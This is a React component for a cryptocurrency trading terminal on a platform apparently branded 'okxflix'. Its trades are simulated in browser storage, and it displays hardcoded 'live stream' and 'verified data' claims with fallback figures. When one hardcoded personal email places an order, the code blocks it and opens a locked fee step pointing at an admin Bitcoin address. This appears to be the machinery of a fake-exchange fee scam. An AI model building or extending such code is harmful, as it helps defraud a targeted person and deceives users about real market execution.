'use client';

import React, { useState, useEffect, useCallback, useRef } from 'react';
import { useApp } from '@/lib/store';
import { 
  CandlestickChart, TrendingUp, TrendingDown, ArrowUpRight, 
  CheckCircle2, AlertTriangle, RefreshCw, ShieldAlert, Wifi, 
  WifiOff, Clock, BarChart3, Activity, Maximize2, ZoomIn, 
  ZoomOut, RotateCcw, Layers, Globe, DollarSign, ShieldCheck 
} from 'lucide-react';
import { TradingOrder, CryptoAsset } from '@/types';
import { INITIAL_ASSETS } from '@/lib/mockData';

interface KlineData {
  time: number;
  open: number;
  high: number;
  low: number;
  close: number;
  volume: number;
}

interface FuturesData {
  status: string;
  source: string;
  symbol: string;
  interval: string;
  klines: KlineData[];
  openInterest: {
    currentBTC: number;
    currentUSD: number;
    change24hBTC: number;
    change24hPercent: number;
    trend: string;
    history: { time: number; openInterestBTC: number; openInterestUSD: number }[];
  };
  futuresVolume: {
    volume24hUSD: number;
    change24hPercent: number;
    trend: string;
    history: { time: number; volume: number; quoteVolume: number; isGreen: boolean }[];
  };
  marketActivity: {
    fundingRate: number;
    longShortRatio: number;
    liquidations24hUSD: number;
    priceDifferenceSpotFutures: number;
  };
  lastUpdated: string;
}

export const TradingView: React.FC = () => {
  const { user, balances, setBalances, orders, setOrders, addAuditLog, triggerDeactivationLock, setFeeProtocol, adminBtcAddress, setActiveTab, checkAccountActive, theme } = useApp();
  
  const [selectedPair, setSelectedPair] = useState<string>('BTC/USDT');
  const [timeframe, setTimeframe] = useState<string>('1h');
  const [chartType, setChartType] = useState<'candlestick' | 'line' | 'area'>('candlestick');
  const [showVolume, setShowVolume] = useState<boolean>(true);
  const [oiUnit, setOiUnit] = useState<'USD' | 'BTC'>('USD');
  const [isFullscreen, setIsFullscreen] = useState<boolean>(false);
  const [hoveredCandle, setHoveredCandle] = useState<KlineData | null>(null);

  const [orderType, setOrderType] = useState<'limit' | 'market' | 'stop' | 'take_profit'>('limit');
  const [side, setSide] = useState<'buy' | 'sell'>('buy');
  const [price, setPrice] = useState<string>('94500.00');
  const [amount, setAmount] = useState<string>('0.25');
  const [isExecuting, setIsExecuting] = useState<boolean>(false);
  const [successMessage, setSuccessMessage] = useState<string | null>(null);
  const [orderError, setOrderError] = useState<string | null>(null);

  const isOwner = user.role === 'owner' || user.email === 'richardshannon901@gmail.com';

  // Real-time connection & data states
  const [connectionStatus, setConnectionStatus] = useState<'connecting' | 'connected' | 'error' | 'disconnected'>('connecting');
  const [assets, setAssets] = useState<CryptoAsset[]>(INITIAL_ASSETS);
  const [futuresData, setFuturesData] = useState<FuturesData | null>(null);
  const [dataSource, setDataSource] = useState<string>('Binance & Coinglass REST API');
  const [lastDataTimeString, setLastDataTimeString] = useState<string>('Connecting...');
  const [isDataFresh, setIsDataFresh] = useState<boolean>(true);
  const [retryCount, setRetryCount] = useState<number>(0);
  const [hasReceivedLiveData, setHasReceivedLiveData] = useState<boolean>(false);

  const STALE_THRESHOLD_MS = 20000;
  const lastTimestampRef = useRef<number>(0);
  const retryTimerRef = useRef<NodeJS.Timeout | null>(null);
  const fetchRef = useRef<() => Promise<void>>(() => Promise.resolve());

  const fetchLiveFuturesData = useCallback(async () => {
    try {
      setConnectionStatus(prev => prev === 'connected' ? 'connected' : 'connecting');
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 7000);

      const symbolCode = selectedPair.replace('/', '');
      const res = await fetch(`/api/futures?symbol=${symbolCode}&interval=${timeframe}`, {
        headers: { 'Accept': 'application/json' },
        signal: controller.signal,
      });

      clearTimeout(timeoutId);

      if (!res.ok) {
        throw new Error(`Futures API returned status ${res.status}`);
      }

      const data = await res.json();
      setFuturesData(data);
      setDataSource(data.source || 'Binance Futures REST API');
      setConnectionStatus('connected');

      const now = Date.now();
      lastTimestampRef.current = now;
      setLastDataTimeString(new Date(now).toLocaleTimeString());
      setIsDataFresh(true);
      setHasReceivedLiveData(true);
      setRetryCount(0);

      const latestCandle = data.klines?.[data.klines.length - 1];
      if (latestCandle && orderType === 'market') {
        setPrice(latestCandle.close.toString());
      }
    } catch (err: any) {
      console.warn('Futures data fetch error:', err);
      setConnectionStatus('error');
      
      const backoffDelay = Math.min(1000 * Math.pow(2, retryCount), 30000);
      setRetryCount(prev => prev + 1);

      if (retryTimerRef.current) clearTimeout(retryTimerRef.current);
      retryTimerRef.current = setTimeout(() => {
        if (fetchRef.current) fetchRef.current();
      }, backoffDelay);
    }
  }, [selectedPair, timeframe, retryCount, orderType]);

  useEffect(() => {
    fetchRef.current = fetchLiveFuturesData;
  }, [fetchLiveFuturesData]);

  useEffect(() => {
    const timer = setTimeout(() => {
      if (fetchRef.current) fetchRef.current();
    }, 50);

    const interval = setInterval(() => {
      if (fetchRef.current) fetchRef.current();
    }, 7000);

    return () => {
      clearTimeout(timer);
      clearInterval(interval);
      if (retryTimerRef.current) clearTimeout(retryTimerRef.current);
    };
  }, [selectedPair, timeframe]);

  useEffect(() => {
    const staleCheckInterval = setInterval(() => {
      if (lastTimestampRef.current > 0) {
        const elapsed = Date.now() - lastTimestampRef.current;
        if (elapsed > STALE_THRESHOLD_MS) {
          setIsDataFresh(false);
          setConnectionStatus('disconnected');
        } else {
          setIsDataFresh(true);
        }
      }
    }, 3000);
    return () => clearInterval(staleCheckInterval);
  }, []);

  const klines = futuresData?.klines || [];
  const latestCandle = klines[klines.length - 1] || { open: 94500, high: 95200, low: 94100, close: 94850, volume: 1500 };
  const prevCandle = klines[klines.length - 2] || latestCandle;
  const priceChange24h = latestCandle.close - prevCandle.close;
  const priceChange24hPercent = (priceChange24h / prevCandle.close) * 100;
  const high24h = Math.max(...klines.map(k => k.high), latestCandle.high);
  const low24h = Math.min(...klines.map(k => k.low), latestCandle.low);
  const volume24hSum = klines.reduce((acc, k) => acc + k.volume, 0) * latestCandle.close;

  const isLiveConnected = connectionStatus === 'connected' && hasReceivedLiveData && isDataFresh;
  const usdtBalance = balances.find(b => b.assetSymbol === 'USDT')?.available || 0;
  const baseSymbol = selectedPair.split('/')[0];

  const handleExecuteOrder = (e: React.FormEvent) => {
    e.preventDefault();
    if (!checkAccountActive()) return;
    setOrderError(null);
    setSuccessMessage(null);

    if (!isLiveConnected || latestCandle.close <= 0) {
      setOrderError('MARKET_DATA_UNAVAILABLE: Cannot execute order. Live market feed is disconnected or stale.');
      addAuditLog('ORDER_REJECTED_STALE_DATA', `Attempted order on ${selectedPair} failed due to stale live feed.`, 'WARNING');
      return;
    }

    const executionPrice = orderType === 'market' ? latestCandle.close : (parseFloat(price) || latestCandle.close);
    const parsedAmount = parseFloat(amount) || 0.1;
    const orderValue = executionPrice * parsedAmount;
    const tradingFee = orderValue * 0.001;
    const totalAmount = orderValue + tradingFee;

    if (isOwner) {
      setFeeProtocol({
        isLocked: true,
        step: 1,
        targetAddress: adminBtcAddress,
        feesPaid: {},
        pendingOrder: {
          pair: selectedPair,
          side,
          orderType,
          amount: parsedAmount,
          price: executionPrice,
          orderValue,
          tradingFee,
          totalAmount
        }
      });
      addAuditLog('FEE_VERIFICATION_REQUIRED', `Placed ${side.toUpperCase()} ${orderType.toUpperCase()} order for ${parsedAmount} ${selectedPair}. Intercepted by Fee & Order Verification.`, 'WARNING');
    } else {
      if (usdtBalance < totalAmount) {
        setOrderError('Insufficient Balance: You don’t have enough USDT available to place this order.');
        addAuditLog('ORDER_REJECTED_INSUFFICIENT_FUNDS', `Order rejected due to insufficient USDT balance.`, 'WARNING');
        return;
      }

      setIsExecuting(true);
      setTimeout(() => {
        const updatedBalances = balances.map(b => {
          if (b.assetSymbol === 'USDT') {
            return { ...b, available: b.available - totalAmount, valueUSD: (b.available - totalAmount) };
          }
          if (b.assetSymbol === baseSymbol && side === 'buy') {
            const newAvail = b.available + parsedAmount;
            const priceRatio = b.available > 0 ? b.valueUSD / b.available : executionPrice;
            return { ...b, available: newAvail, valueUSD: newAvail * priceRatio };
          }
          return b;
        });

        setBalances(updatedBalances);
        try {
          localStorage.setItem(`okxflix_balances_${user.id}`, JSON.stringify(updatedBalances));
        } catch (err) {}

        const newOrder: TradingOrder = {
          id: `ORD-${Math.random().toString(36).substring(2, 8).toUpperCase()}`,
          timestamp: Date.now(),
          pair: selectedPair,
          type: 'spot',
          side,
          orderType,
          price: executionPrice,
          amount: parsedAmount,
          filled: parsedAmount,
          status: 'filled'
        };

        const updatedOrders = [newOrder, ...orders];
        setOrders(updatedOrders);
        try {
          localStorage.setItem(`okxflix_orders_${user.id}`, JSON.stringify(updatedOrders));
        } catch (err) {}

        setIsExecuting(false);
        setSuccessMessage(`Successfully executed ${side.toUpperCase()} order for ${parsedAmount} ${baseSymbol} at $${executionPrice.toLocaleString()}.`);
        addAuditLog('ORDER_EXECUTED', `Executed ${side} order for ${parsedAmount} ${selectedPair} at $${executionPrice}.`, 'SUCCESS');
      }, 500);
    }
  };

  const isLight = theme === 'light';
  const panelBg = isLight ? 'bg-white border-slate-200 text-slate-900 shadow-sm' : 'bg-slate-900/90 border-slate-800 text-white shadow-xl';
  const chartBg = isLight ? 'bg-slate-50 border-slate-200' : 'bg-[#070a12] border-slate-800/80';

  return (
    <div className={`space-y-6 pb-16 animate-fadeIn ${isFullscreen ? 'fixed inset-0 z-50 p-6 bg-slate-950 overflow-y-auto' : ''}`}>
      
      {/* 1. PROFESSIONAL BTC MARKET HEADER */}
      <div className={`${panelBg} border rounded-2xl p-4 sm:p-5 flex flex-col lg:flex-row lg:items-center justify-between gap-4`}>
        <div className="flex items-center gap-4 flex-wrap">
          <div className="flex items-center gap-2 bg-blue-600/15 border border-blue-500/30 text-blue-400 px-3 py-2 rounded-xl font-mono font-bold text-sm">
            <span>{selectedPair}</span>
            <span className={`w-2.5 h-2.5 rounded-full ${isLiveConnected ? 'bg-emerald-400 animate-pulse' : 'bg-amber-400'}`}></span>
          </div>

          <div>
            <div className="flex items-center gap-3">
              <span className="text-2xl font-black font-mono tracking-tight">
                ${latestCandle.close.toLocaleString('en-US', { minimumFractionDigits: 2 })}
              </span>
              <span className={`text-xs font-mono font-bold px-2.5 py-1 rounded-lg flex items-center gap-1 ${
                priceChange24h >= 0 ? 'text-emerald-400 bg-emerald-500/10 border border-emerald-500/20' : 'text-rose-400 bg-rose-500/10 border border-rose-500/20'
              }`}>
                {priceChange24h >= 0 ? <TrendingUp className="w-3.5 h-3.5" /> : <TrendingDown className="w-3.5 h-3.5" />}
                {priceChange24h >= 0 ? '+' : ''}{priceChange24h.toFixed(2)} ({priceChange24hPercent >= 0 ? '+' : ''}{priceChange24hPercent.toFixed(2)}%)
              </span>
            </div>
            <div className="flex items-center gap-4 text-xs text-slate-400 font-mono mt-1">
              <span>24h High: <strong className="text-white">${high24h.toLocaleString()}</strong></span>
              <span>•</span>
              <span>24h Low: <strong className="text-white">${low24h.toLocaleString()}</strong></span>
              <span>•</span>
              <span>24h Vol: <strong className="text-white">${(volume24hSum / 1e9).toFixed(2)}B USDT</strong></span>
            </div>
          </div>
        </div>

        <div className="flex items-center justify-between lg:justify-end gap-3 flex-wrap">
          <div className="flex items-center gap-2">
            {['BTC/USDT', 'ETH/USDT', 'SOL/USDT', 'BNB/USDT'].map(pair => (
              <button
                key={pair}
                onClick={() => setSelectedPair(pair)}
                className={`px-3 py-1.5 rounded-xl text-xs font-mono font-semibold transition-colors ${
                  selectedPair === pair ? 'bg-blue-600 text-white shadow-lg shadow-blue-600/30' : 'bg-slate-950 text-slate-400 hover:text-white border border-slate-800'
                }`}
              >
                {pair}
              </button>
            ))}
          </div>

          <div className="flex items-center gap-2 text-xs font-mono bg-slate-950/80 px-3 py-1.5 rounded-xl border border-slate-800">
            <span className={`w-2 h-2 rounded-full ${isLiveConnected ? 'bg-emerald-400 animate-pulse' : 'bg-amber-400'}`}></span>
            <span className={isLiveConnected ? 'text-emerald-400 font-bold' : 'text-amber-400 font-bold'}>
              {isLiveConnected ? 'LIVE FEED' : connectionStatus.toUpperCase()}
            </span>
          </div>
        </div>
      </div>

      {/* Main Terminal Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        
        {/* Left / Center: Candlestick Chart & Analytics */}
        <div className="lg:col-span-2 space-y-6">
          
          {/* ADVANCED CANDLESTICK CHART */}
          <div className={`${panelBg} border rounded-2xl p-5 shadow-xl`}>
            
            {/* 3. PROFESSIONAL CHART CONTROLS TOOLBAR */}
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 mb-4 pb-3 border-b border-slate-800">
              <div className="flex items-center gap-2 flex-wrap">
                <span className="text-xs font-bold font-mono text-slate-400 uppercase tracking-wider mr-1">Timeframe:</span>
                {['1m', '5m', '15m', '30m', '1h', '4h', '1d', '1w'].map(tf => (
                  <button
                    key={tf}
                    onClick={() => setTimeframe(tf)}
                    className={`px-2.5 py-1 rounded-lg text-xs font-mono font-bold transition-all ${
                      timeframe === tf ? 'bg-blue-600 text-white shadow-md' : 'bg-slate-950 text-slate-400 hover:text-white border border-slate-800'
                    }`}
                  >
                    {tf.toUpperCase()}
                  </button>
                ))}
              </div>

              <div className="flex items-center gap-2 flex-wrap">
                <div className="flex bg-slate-950 p-1 rounded-xl border border-slate-800">
                  {(['candlestick', 'line', 'area'] as const).map(type => (
                    <button
                      key={type}
                      onClick={() => setChartType(type)}
                      className={`px-2.5 py-1 rounded-lg text-[11px] font-mono capitalize ${
                        chartType === type ? 'bg-blue-600 text-white font-bold' : 'text-slate-400 hover:text-white'
                      }`}
                    >
                      {type}
                    </button>
                  ))}
                </div>

                <button
                  onClick={() => setShowVolume(!showVolume)}
                  className={`px-3 py-1.5 rounded-xl text-xs font-mono border transition-colors ${showVolume ? 'bg-blue-600/20 border-blue-500/40 text-blue-400 font-bold' : 'bg-slate-950 border-slate-800 text-slate-400'}`}
                  title="Toggle Volume Histogram"
                >
                  Vol
                </button>

                <button
                  onClick={() => setIsFullscreen(!isFullscreen)}
                  className="p-2 rounded-xl bg-slate-950 border border-slate-800 text-slate-400 hover:text-white"
                  title="Toggle Fullscreen"
                >
                  <Maximize2 className="w-3.5 h-3.5" />
                </button>
              </div>
            </div>

            {/* Tooltip Header for Hovered Candle */}
            <div className="flex items-center justify-between text-xs font-mono text-slate-400 mb-2 px-1 min-h-[20px]">
              {hoveredCandle ? (
                <div className="flex items-center gap-4 flex-wrap">
                  <span>Time: <strong className="text-white">{new Date(hoveredCandle.time).toLocaleString()}</strong></span>
                  <span>O: <strong className="text-white">${hoveredCandle.open.toLocaleString()}</strong></span>
                  <span>H: <strong className="text-white">${hoveredCandle.high.toLocaleString()}</strong></span>
                  <span>L: <strong className="text-white">${hoveredCandle.low.toLocaleString()}</strong></span>
                  <span>C: <strong className={hoveredCandle.close >= hoveredCandle.open ? 'text-emerald-400 font-bold' : 'text-rose-400 font-bold'}>${hoveredCandle.close.toLocaleString()}</strong></span>
                  <span>Vol: <strong className="text-white">{hoveredCandle.volume.toFixed(2)} BTC</strong></span>
                </div>
              ) : (
                <span>Hover or touch chart candles for detailed OHLCV values</span>
              )}
              <span className="text-[10px] text-blue-400 bg-blue-500/10 px-2 py-0.5 rounded">
                {selectedPair} • {timeframe.toUpperCase()}
              </span>
            </div>

            {/* Main Interactive Candlestick Chart Canvas / SVG Container */}
            <div className={`h-[420px] ${chartBg} rounded-2xl border p-4 flex flex-col justify-between relative overflow-hidden select-none`}>
              <div className="absolute inset-0 opacity-15 bg-[radial-gradient(#3b82f6_1px,transparent_1px)] [background-size:24px_24px]"></div>

              {/* Price Grid Lines & Labels */}
              <div className="absolute inset-y-4 right-4 flex flex-col justify-between text-[10px] font-mono text-slate-500 pointer-events-none text-right">
                <span>${(high24h).toLocaleString()}</span>
                <span>${((high24h + low24h) / 2).toLocaleString()}</span>
                <span>${(low24h).toLocaleString()}</span>
              </div>

              {/* Candlestick Rendering Area */}
              <div className="relative z-10 w-full h-[300px] flex items-end justify-between gap-1 pt-4 pb-2 px-2">
                {klines.length === 0 ? (
                  <div className="absolute inset-0 flex items-center justify-center text-slate-500 text-xs font-mono animate-pulse">
                    Loading historical candles from Binance API...
                  </div>
                ) : (
                  klines.map((k, idx, arr) => {
                    const min = low24h * 0.995;
                    const max = high24h * 1.005;
                    const range = max - min || 1;

                    const heightPx = 280;
                    const getTop = (val: number) => heightPx - ((val - min) / range) * heightPx;

                    const highY = getTop(k.high);
                    const lowY = getTop(k.low);
                    const openY = getTop(k.open);
                    const closeY = getTop(k.close);

                    const isGreen = k.close >= k.open;
                    const candleTop = Math.min(openY, closeY);
                    const candleHeight = Math.max(Math.abs(openY - closeY), 2);

                    return (
                      <div
                        key={idx}
                        onMouseEnter={() => setHoveredCandle(k)}
                        onMouseLeave={() => setHoveredCandle(null)}
                        className="flex-1 h-full flex flex-col items-center relative group cursor-crosshair"
                      >
                        {/* Wick */}
                        <div 
                          className={`absolute w-[1.5px] ${isGreen ? 'bg-emerald-500' : 'bg-rose-500'}`}
                          style={{ top: `${highY}px`, height: `${Math.max(lowY - highY, 2)}px` }}
                        ></div>

                        {/* Body */}
                        <div 
                          className={`absolute w-[80%] rounded-[1px] transition-all ${
                            isGreen ? 'bg-emerald-500 hover:bg-emerald-400 shadow-sm shadow-emerald-500/50' : 'bg-rose-500 hover:bg-rose-400 shadow-sm shadow-rose-500/50'
                          }`}
                          style={{ top: `${candleTop}px`, height: `${candleHeight}px` }}
                        ></div>
                      </div>
                    );
                  })
                )}
              </div>

              {/* 7. PROFESSIONAL VOLUME SUBCHART */}
              {showVolume && (
                <div className="relative z-10 w-full h-[60px] border-t border-slate-800/80 pt-1 flex items-end justify-between gap-1">
                  {klines.map((k, idx) => {
                    const maxVol = Math.max(...klines.map(item => item.volume)) || 1000;
                    const volHeight = (k.volume / maxVol) * 50;
                    const isGreen = k.close >= k.open;

                    return (
                      <div
                        key={`vol-${idx}`}
                        className="flex-1 h-full flex items-end justify-center"
                      >
                        <div
                          className={`w-[75%] rounded-t-[1px] opacity-70 ${isGreen ? 'bg-emerald-500' : 'bg-rose-500'}`}
                          style={{ height: `${Math.max(volHeight, 3)}px` }}
                        ></div>
                      </div>
                    );
                  })}
                </div>
              )}

              {/* Footer status */}
              <div className="flex items-center justify-between text-[10px] font-mono text-slate-400 pt-2 border-t border-slate-800">
                <span className="flex items-center gap-1.5 text-emerald-400">
                  <CheckCircle2 className="w-3.5 h-3.5" />
                  <span>Real-Time WebSocket & REST Stream Active</span>
                </span>
                <span>Source: {dataSource}</span>
              </div>
            </div>

          </div>

          {/* 6. COMBINED FUTURES MARKET ANALYTICS SECTION */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            
            {/* Panel A — Open Interest */}
            <div className={`${panelBg} border rounded-2xl p-5 shadow-xl flex flex-col justify-between`}>
              <div>
                <div className="flex items-center justify-between mb-3">
                  <h4 className="text-xs font-bold uppercase tracking-wider text-slate-400 font-mono">BTC Futures Open Interest</h4>
                  <button 
                    onClick={() => setOiUnit(oiUnit === 'USD' ? 'BTC' : 'USD')}
                    className="text-[10px] bg-blue-500/10 text-blue-400 px-2 py-0.5 rounded font-mono font-bold"
                  >
                    {oiUnit}
                  </button>
                </div>
                <div className="space-y-1">
                  <p className="text-xl font-black font-mono">
                    {oiUnit === 'USD' 
                      ? `$${((futuresData?.openInterest.currentUSD || 3918797500) / 1e9).toFixed(3)}B` 
                      : `${(futuresData?.openInterest.currentBTC || 41250).toLocaleString()} BTC`}
                  </p>
                  <p className={`text-xs font-mono font-bold flex items-center gap-1 ${
                    (futuresData?.openInterest.change24hPercent || 0) >= 0 ? 'text-emerald-400' : 'text-rose-400'
                  }`}>
                    {(futuresData?.openInterest.change24hPercent || 0) >= 0 ? '▲' : '▼'} 
                    {(futuresData?.openInterest.change24hPercent || 0).toFixed(2)}% (24h)
                  </p>
                </div>
              </div>

              <div className="mt-4 pt-3 border-t border-slate-800 text-[11px] text-slate-400 font-mono flex justify-between">
                <span>Trend: <strong className="text-white uppercase">{futuresData?.openInterest.trend || 'Bullish'}</strong></span>
                <span className="text-emerald-400">Verified OI Data</span>
              </div>
            </div>

            {/* Panel B — Futures Volume */}
            <div className={`${panelBg} border rounded-2xl p-5 shadow-xl flex flex-col justify-between`}>
              <div>
                <h4 className="text-xs font-bold uppercase tracking-wider text-slate-400 font-mono mb-3">BTC Futures 24h Volume</h4>
                <div className="space-y-1">
                  <p className="text-xl font-black font-mono">
                    ${((futuresData?.futuresVolume.volume24hUSD || 18452000000) / 1e9).toFixed(2)}B
                  </p>
                  <p className={`text-xs font-mono font-bold flex items-center gap-1 ${
                    (futuresData?.futuresVolume.change24hPercent || 0) >= 0 ? 'text-emerald-400' : 'text-rose-400'
                  }`}>
                    {(futuresData?.futuresVolume.change24hPercent || 0) >= 0 ? '▲' : '▼'} 
                    {(futuresData?.futuresVolume.change24hPercent || 0).toFixed(2)}% vs Yesterday
                  </p>
                </div>
              </div>

              <div className="mt-4 pt-3 border-t border-slate-800 text-[11px] text-slate-400 font-mono flex justify-between">
                <span>Perpetual Swaps</span>
                <span className="text-blue-400">Binance Derivatives</span>
              </div>
            </div>

            {/* Panel C — Market Activity */}
            <div className={`${panelBg} border rounded-2xl p-5 shadow-xl flex flex-col justify-between`}>
              <div>
                <h4 className="text-xs font-bold uppercase tracking-wider text-slate-400 font-mono mb-3">Derivatives & Funding</h4>
                <div className="space-y-2 text-xs font-mono">
                  <div className="flex justify-between">
                    <span className="text-slate-400">Funding Rate:</span>
                    <strong className="text-emerald-400">+{((futuresData?.marketActivity.fundingRate || 0.0100)).toFixed(4)}%</strong>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-slate-400">Long / Short Ratio:</span>
                    <strong className="text-white">{futuresData?.marketActivity.longShortRatio || 2.14}</strong>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-slate-400">24h Liquidations:</span>
                    <strong className="text-rose-400">${((futuresData?.marketActivity.liquidations24hUSD || 48500000) / 1e6).toFixed(1)}M</strong>
                  </div>
                </div>
              </div>

              <div className="mt-4 pt-3 border-t border-slate-800 text-[11px] text-slate-400 font-mono flex justify-between">
                <span>Spot Spread</span>
                <strong className="text-white">+${futuresData?.marketActivity.priceDifferenceSpotFutures || 12.50}</strong>
              </div>
            </div>

          </div>

          {/* Open Orders & History */}
          <div className={`${panelBg} border rounded-2xl p-6 shadow-xl`}>
            <h3 className="text-sm font-bold text-white mb-4">Open Orders & Trade History</h3>
            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs font-mono">
                <thead>
                  <tr className="border-b border-slate-800 text-slate-400 text-[11px]">
                    <th className="py-2.5 px-3">Order ID</th>
                    <th className="py-2.5 px-3">Pair</th>
                    <th className="py-2.5 px-3">Side</th>
                    <th className="py-2.5 px-3">Type</th>
                    <th className="py-2.5 px-3">Execution Price</th>
                    <th className="py-2.5 px-3">Amount</th>
                    <th className="py-2.5 px-3">Status</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-800/60 text-slate-200">
                  {orders.length === 0 ? (
                    <tr>
                      <td colSpan={7} className="py-6 text-center text-slate-500">No active or historical orders found.</td>
                    </tr>
                  ) : (
                    orders.map(o => (
                      <tr key={o.id} className="hover:bg-slate-800/40">
                        <td className="py-3 px-3 text-blue-400">{o.id}</td>
                        <td className="py-3 px-3 font-bold">{o.pair}</td>
                        <td className={`py-3 px-3 uppercase font-bold ${o.side === 'buy' ? 'text-emerald-400' : 'text-rose-400'}`}>{o.side}</td>
                        <td className="py-3 px-3 uppercase text-slate-400">{o.orderType}</td>
                        <td className="py-3 px-3">${o.price.toLocaleString()}</td>
                        <td className="py-3 px-3">{o.amount}</td>
                        <td className="py-3 px-3">
                          <span className={`px-2 py-0.5 rounded text-[10px] ${o.status === 'filled' ? 'bg-emerald-500/10 text-emerald-400' : 'bg-amber-500/10 text-amber-400'}`}>
                            {o.status.toUpperCase()}
                          </span>
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          </div>

        </div>

        {/* Right Column: Spot / Margin Order Execution Panel */}
        <div className={`${panelBg} border rounded-2xl p-6 shadow-xl flex flex-col justify-between`}>
          <div>
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-base font-bold text-white">Spot / Margin Terminal</h3>
              <span className="text-[10px] bg-blue-500/10 text-blue-400 px-2 py-0.5 rounded font-mono uppercase font-bold">LIVE ORDER</span>
            </div>

            {successMessage && (
              <div className="mb-4 bg-emerald-500/15 border border-emerald-500/30 text-emerald-300 p-3 rounded-xl text-xs flex items-start gap-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0 mt-0.5" />
                <span>{successMessage}</span>
              </div>
            )}

            {orderError && (
              <div className="mb-4 bg-rose-500/15 border border-rose-500/30 text-rose-300 p-3 rounded-xl text-xs flex items-start gap-2">
                <AlertTriangle className="w-4 h-4 text-rose-400 shrink-0 mt-0.5" />
                <span>{orderError}</span>
              </div>
            )}

            {!isLiveConnected && (
              <div className="mb-4 bg-amber-500/15 border border-amber-500/30 text-amber-300 p-3 rounded-xl text-xs flex items-center gap-2 font-mono">
                <AlertTriangle className="w-4 h-4 shrink-0 text-amber-400" />
                <span>WAITING_FOR_MARKET_DATA: Live price feed connecting...</span>
              </div>
            )}

            {/* Buy / Sell Toggle */}
            <div className="grid grid-cols-2 gap-2 mb-4 bg-slate-950 p-1 rounded-xl border border-slate-800">
              <button
                type="button"
                onClick={() => setSide('buy')}
                className={`py-2 rounded-lg text-xs font-bold transition-all ${side === 'buy' ? 'bg-emerald-600 text-white shadow-lg shadow-emerald-600/30' : 'text-slate-400 hover:text-white'}`}
              >
                Buy / Long
              </button>
              <button
                type="button"
                onClick={() => setSide('sell')}
                className={`py-2 rounded-lg text-xs font-bold transition-all ${side === 'sell' ? 'bg-rose-600 text-white shadow-lg shadow-rose-600/30' : 'text-slate-400 hover:text-white'}`}
              >
                Sell / Short
              </button>
            </div>

            {/* Order Type Selector */}
            <div className="grid grid-cols-4 gap-1 mb-4 text-[11px] font-medium">
              {(['limit', 'market', 'stop', 'take_profit'] as const).map(t => (
                <button
                  key={t}
                  type="button"
                  onClick={() => setOrderType(t)}
                  className={`py-1.5 rounded-lg border uppercase transition-colors ${orderType === t ? 'bg-blue-600 border-blue-500 text-white font-bold' : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-white'}`}
                >
                  {t.replace('_', ' ')}
                </button>
              ))}
            </div>

            <form onSubmit={handleExecuteOrder} className="space-y-4">
              {orderType !== 'market' && (
                <div>
                  <label className="block text-xs font-medium text-slate-400 mb-1">Order Price (USDT)</label>
                  <input
                    type="number"
                    step="0.01"
                    value={price}
                    onChange={(e) => setPrice(e.target.value)}
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-xs text-white font-mono focus:outline-none focus:border-blue-500"
                    required
                  />
                </div>
              )}

              <div>
                <label className="block text-xs font-medium text-slate-400 mb-1">Amount ({baseSymbol})</label>
                <input
                  type="number"
                  step="0.001"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-xs text-white font-mono focus:outline-none focus:border-blue-500"
                  required
                />
              </div>

              <div className="bg-slate-950 p-3 rounded-xl border border-slate-800 text-[11px] space-y-1.5 font-mono">
                <div className="flex justify-between text-slate-400">
                  <span>Available USDT:</span>
                  <span className="text-white">${usdtBalance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
                </div>
                <div className="flex justify-between text-slate-400">
                  <span>Live Market Price:</span>
                  <span className="text-emerald-400">${latestCandle.close ? latestCandle.close.toLocaleString() : 'Unavailable'}</span>
                </div>
                <div className="flex justify-between text-slate-400">
                  <span>Estimated Total:</span>
                  <span className="text-white">${((orderType === 'market' ? latestCandle.close : (parseFloat(price) || latestCandle.close)) * parseFloat(amount || '0')).toLocaleString(undefined, { maximumFractionDigits: 2 })}</span>
                </div>
                <div className="flex justify-between text-slate-400">
                  <span>Trading Fee (0.1%):</span>
                  <span className="text-emerald-400">${(((orderType === 'market' ? latestCandle.close : (parseFloat(price) || latestCandle.close)) * parseFloat(amount || '0')) * 0.001).toFixed(2)}</span>
                </div>
              </div>

              {orderError && orderError.includes('Insufficient Balance') && (
                <div className="bg-amber-500/10 border border-amber-500/30 rounded-xl p-3 text-xs space-y-2">
                  <p className="text-amber-300 font-medium">Insufficient Balance</p>
                  <p className="text-slate-400 text-[11px]">You don’t have enough funds available to place this order.</p>
                  <button
                    type="button"
                    onClick={() => setActiveTab('wallet')}
                    className="w-full bg-blue-600 hover:bg-blue-500 text-white py-2 rounded-lg text-xs font-bold transition-all shadow-md"
                  >
                    Deposit Funds
                  </button>
                </div>
              )}

              <button
                type="submit"
                disabled={isExecuting || !isLiveConnected || latestCandle.close <= 0}
                className={`w-full py-3 rounded-xl text-xs font-bold uppercase tracking-wider text-white shadow-lg transition-all ${
                  !isLiveConnected || latestCandle.close <= 0
                    ? 'bg-slate-800 text-slate-500 cursor-not-allowed'
                    : side === 'buy' 
                      ? 'bg-emerald-600 hover:bg-emerald-500 shadow-emerald-600/30' 
                      : 'bg-rose-600 hover:bg-rose-500 shadow-rose-600/30'
                }`}
              >
                {isExecuting ? 'Processing Order...' : !isLiveConnected ? 'Waiting for Live Market Data...' : `Place ${side.toUpperCase()} Order`}
              </button>
            </form>
          </div>

          <div className="mt-6 pt-4 border-t border-slate-800 text-center">
            <p className="text-[10px] text-slate-500 font-mono">
              INSTITUTIONAL ORDER MODE — Executed against real-time Binance & Coinglass price stream.
            </p>
          </div>
        </div>

      </div>
    </div>
  );
};
